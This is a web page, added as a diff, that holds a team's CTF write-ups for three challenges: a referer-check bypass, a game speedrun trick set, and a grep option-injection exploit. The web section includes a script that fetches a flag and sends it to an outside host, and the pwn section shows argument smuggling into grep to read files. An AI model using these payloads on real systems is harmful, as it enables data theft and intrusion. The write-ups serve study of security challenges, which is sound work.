@@ -1,0 +1,301 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>S㎩mAndFlags Uけimate w呎は屸de C㏊mᒆonship Teaser ꕫꕫ - ㎩㏚i㎄ Edition</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#pwnzi-2-&-3">pwnzi-2-&-3</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                rev
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#tas">tas</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#environmental-issues">environmental-issues</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#pwnzi-2-&-3" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">pwnzi-2-&-3</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">rev</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#tas" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">tas</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#environmental-issues" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">environmental-issues</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="s㎩mandflags-uけimate-w呎は屸de-c㏊mᒆonship-teaser-ꕫꕫ---㎩㏚i㎄-edition"><a class="header-link" href="#s㎩mandflags-uけimate-w呎は屸de-c㏊mᒆonship-teaser-ꕫꕫ---㎩㏚i㎄-edition"></a>S㎩mAndFlags Uけimate w呎は屸de C㏊mᒆonship Teaser ꕫꕫ - ㎩㏚i㎄ Edition</h1>
+
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="pwnzi-2-&-3"><a class="header-link" href="#pwnzi-2-&-3"></a>Pwnzi 2 &amp; 3</h3>
+<p>Various ways to bypass referer check in the same origin:</p>
+<p>Use <code>history.pushState</code> to bypass referer check. It seems that specifiying referer in <code>fetch()</code> can also works. The flag <code>SaF{service_workers_are_useless_they_say}</code> indicates that the intended solution is about service worker, but I didn&#39;t use that.</p>
+<pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+history.pushState({}, <span class="hljs-string">""</span>, <span class="hljs-string">"/profile.html"</span>);
+setInterval(<span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> {
+  fetch(<span class="hljs-string">'//example.com/?ping'</span>);
+}, <span class="hljs-number">1000</span>);
+fetch(<span class="hljs-string">'/flag2'</span>).then(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.text()).then(<span class="hljs-function"><span class="hljs-params">t</span>=&gt;</span>fetch(<span class="hljs-string">'//example.com/?'</span>+<span class="hljs-built_in">encodeURI</span>(t)));
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><h2 id="rev"><a class="header-link" href="#rev"></a>Rev</h2>
+<h3 id="tas"><a class="header-link" href="#tas"></a>TAS</h3>
+<p>Here are some tricks which can help you reduce the number of frames:</p>
+<h4 id="1.-beat-the-rng-of-rndspike"><a class="header-link" href="#1.-beat-the-rng-of-rndspike"></a>1. Beat the RNG of RndSpike</h4>
+<p>Take a look of <code>Rnd.py</code>. it tells you that <code>LCG influenced by the keypresses</code>. So I wrote a simulator to predict the movements of spike.</p>
+<h4 id="2.-crouch-can-reset-attack-timer"><a class="header-link" href="#2.-crouch-can-reset-attack-timer"></a>2. Crouch can reset attack timer</h4>
+<p>According to <code>Player.py</code>. you can crouch immediately after you punch to reset the attack timer. By repeating punch and crouch, you can deal one damage per two frames. This trick helps you quickly kill <code>TRex</code></p>
+<pre class="hljs"><code>...
+  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">startCrouching</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span>:
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">self</span>.crouching <span class="hljs-keyword">and</span> <span class="hljs-keyword">self</span>.<span class="hljs-symbol">onGround:</span>
+      <span class="hljs-keyword">self</span>.crouching = True
+      <span class="hljs-keyword">self</span>.attackTimer = <span class="hljs-number">0</span>
+      <span class="hljs-keyword">self</span>.collRect = Rect(<span class="hljs-number">20</span>, <span class="hljs-number">32</span>, <span class="hljs-number">26</span>, <span class="hljs-number">18</span>)
+...</code></pre><p>By using these two tricks, I got the first two flags</p>
+<h4 id="3.-write-a-script-to-produce-moveset"><a class="header-link" href="#3.-write-a-script-to-produce-moveset"></a>3. Write a script to produce moveset</h4>
+<p>Human makes mistakes, so I wrote a script to produce the moveset. A mistake-free moveset saves lots of frame.</p>
+<p>Then I got the third flag.</p>
+<h4 id="4.-place-one-orb-on-two-orb-holders"><a class="header-link" href="#4.-place-one-orb-on-two-orb-holders"></a>4. Place one orb on two orb holders</h4>
+<p>I found that there are two orb holders which are very close to each other. I thought maybe we can place one orb on two orb holders. By analyzing the code below at <code>Player.py</code>, I found we can trigger two orb holders when standing between them.</p>
+<pre class="hljs"><code>...
+  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">placeOrbOnStand</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span>:
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">self</span>.isImmobile():
+      <span class="hljs-keyword">return</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">self</span>.isAttacking() <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">self</span>.<span class="hljs-symbol">onGround:</span>
+      <span class="hljs-keyword">return</span> False
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">self</span>.<span class="hljs-symbol">holdingOrb:</span>
+      <span class="hljs-keyword">return</span>
+    print(<span class="hljs-string">"placeorb"</span>)
+    rect = <span class="hljs-keyword">self</span>.getCollRect()
+    offsets = [(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>), (-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>)]
+    midX = floor(rect.centerx / Tile.LENGTH)
+    midY = floor(rect.centery / Tile.LENGTH)
+    <span class="hljs-keyword">for</span> offset <span class="hljs-keyword">in</span> <span class="hljs-symbol">offsets:</span>
+      x = midX + offset[<span class="hljs-number">0</span>]
+      y = midY + offset[<span class="hljs-number">1</span>]
+      tile = <span class="hljs-keyword">self</span>.map.getTile(x, y)
+      <span class="hljs-keyword">if</span> tile is <span class="hljs-keyword">not</span> None <span class="hljs-keyword">and</span> tile.id == Tile.<span class="hljs-symbol">ORB_HOLDER_OFF:</span>
+        tileRect = tile.getCollRect().move(x*Tile.LENGTH, y*Tile.LENGTH)
+        <span class="hljs-keyword">if</span> ((tileRect.centerx &gt; rect.centerx <span class="hljs-keyword">and</span> <span class="hljs-keyword">self</span>.keysPressed.right)
+            <span class="hljs-keyword">or</span> (tileRect.centerx &lt; rect.centerx <span class="hljs-keyword">and</span> <span class="hljs-keyword">self</span>.keysPressed.left)):
+          <span class="hljs-keyword">self</span>.map.triggerOrb(x, y)
+          <span class="hljs-keyword">self</span>.holdingOrb = False
+          <span class="hljs-comment"># since it didn't break the loop, we can trigger more than one orb holder if they are close enough to each other</span>
+...</code></pre><p>This trick helps me get the fourth flag and the fifth flag.</p>
+<h4 id="5.-skip-the-second-orbspike"><a class="header-link" href="#5.-skip-the-second-orbspike"></a>5. Skip the second orbspike</h4>
+<p>This is the last trick I found: When you are damaged, you&#39;ll be invulnerable in a short period. But only the second orbspike can be skipped by this trick.</p>
+<p>That&#39;s all. Now we can get all the flags.</p>
+<p><a href="https://pastebin.com/1XTVWxFG">https://pastebin.com/1XTVWxFG</a></p>
+<p class="img-container"><img src="https://i.imgur.com/HJFxtVK.png" alt=""></p>
+<div style='position:relative; padding-bottom:calc(73.98% + 44px)'><iframe src='https://gfycat.com/ifr/ComplexPossibleErmine' frameborder='0' scrolling='no' width='100%' height='100%' style='position:absolute;top:0;left:0;' allowfullscreen></iframe></div>
+
+
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
+<h3 id="environmental-issues"><a class="header-link" href="#environmental-issues"></a>Environmental Issues</h3>
+<p>This write-up is for the unpatched version. For the patched version, we didn&#39;t find the <code>BASH_FUNC_[function name]%%</code> trick and got no flag in that challenge.</p>
+<p>After you saw the releasing of the patched version, check what&#39;s the patch:</p>
+<p>Original</p>
+<pre class="hljs"><code><span class="hljs-attr">line</span>=<span class="hljs-string">"$(grep "</span><span class="hljs-variable">${1:?Missing arg1: name}</span><span class="hljs-string">" &lt; issues.txt)"</span></code></pre><p>After the fix</p>
+<pre class="hljs"><code><span class="hljs-attr">line</span>=<span class="hljs-string">"$(grep -- "</span><span class="hljs-variable">${1:?Missing arg1: name}</span><span class="hljs-string">" &lt; issues.txt)"</span></code></pre><p>This is the only line being modified in the shell code (there are some unimportant changes in other files though). Clearly, the vulnerability is to put option(s) to grep.</p>
+<p>Check the manual for any option that could read a file, we found <code>-f [FILE]</code> would read the patterns from the FILE. After testing, we confirmed that it could be put as <code>-fflag</code> (without whitespace), and we could also use <code>-eFlagFragment</code>. They provide almost same effects and, the most important, we still got room for more short options.</p>
+<p>We could put <code>-r</code> since grep searches the working directory if no file operand is given (note that <code>issues.txt</code> is fed by redirection). Now with <code>-reFlagFragment</code>, it works locally without sandbox. But this would timeout in the sandbox and abort the connection immediately for remote (couldn&#39;t even get the output from <code>challenge.py</code>).</p>
+<p>There are many options to optimize the search. The only useful one I found is <code>-I</code> to ignore all binary files. Now put <code>-rIeFlagFragment</code> as argument and generated 16 arbitrary keys, then you&#39;ll get 4 flags!</p>
+<p>Here are the lovely flags:
+<code>SaF{PleaseStopExploitingTheEnvironmentSeeHowBeautifulSheIs🌍}</code>
+<code>SaF{NiceJobYouHaveJustKilledAllTheBees🐝StopNowBeforeItIsTooLate!}</code>
+<code>SaF{HereIsYourFlagButAtWhatPrice?https://www.youtube.com/watch?v=eROSvnr3QZM}</code>
+<code>SaF{🔥UNINTENDED💀ENVIRON🔥MENTAL💀COLLAPSE🔥}</code></p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
